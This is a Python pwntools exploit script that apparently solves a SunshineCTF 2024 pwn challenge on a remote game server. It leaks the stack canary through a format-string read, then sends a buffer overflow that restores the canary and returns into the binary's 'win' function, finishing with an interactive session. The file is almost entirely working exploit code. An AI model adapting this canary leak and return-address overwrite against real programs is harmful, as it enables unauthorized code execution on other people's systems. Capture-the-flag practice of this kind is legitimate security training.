#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT = 24610

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def exploit(p,e):

    ru(p,b"Enter Code: ")
    test_payload = b"wambo-jambo" + p32(0xfeedc0de)

    sl(p,test_payload)

    ru(p,b"It's time for a beach party!!")
    ru(p,b"should we bring?")

    sl(p,b"%21$p")

    rl(p)
    canary = int(rl(p).strip(b"\n"),16)
    log.info(f"Leaked canary {hex(canary)}")


    ru(p,b"at the beach?")

    r = ROP(e)
    pad = b"A" * 120 + p64(canary) 
    chain = b"A" * 8 + p64(r.find_gadget(["ret"])[0]) + p64(e.sym["win"])
    sl(p,pad+chain)

   
    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
